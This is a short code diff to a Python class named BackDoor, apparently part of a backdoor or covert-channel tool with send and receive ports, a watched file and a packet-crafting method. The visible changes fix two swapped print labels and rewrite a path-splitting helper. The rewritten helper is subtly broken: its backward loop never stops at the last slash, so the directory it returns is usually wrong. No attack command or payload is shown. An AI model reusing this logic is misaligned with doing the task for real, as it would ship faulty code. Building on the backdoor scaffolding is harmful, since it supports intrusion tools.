@@ -186,17 +186,18 @@ class BackDoor:
         print(f"Send is {self.send_port}")
         print(f"recv is {self.recv_port}")
         print(f"proto  is {self.proto}")
-        print(f"file  is {self.watch_dir}")
-        print(f"dir  is {self.watch_file}")
+        print(f"file  is {self.watch_file}")
+        print(f"dir  is {self.watch_dir}")
 
     def watch_settings(self, path) -> tuple[str,str]:
-        print(path)
         file = path.split("/")[-1]
-        dir = ""
+        directory = ""
+        index = 0
         for i in range(len(path)-1, -1, -1):
             if path[i] == "/":
-                return dir, file
-            dir += path[i]
+                index = i
+        directory = path[:index]
+        return directory, file
 
 
     def craft_packet(self, msg: str):
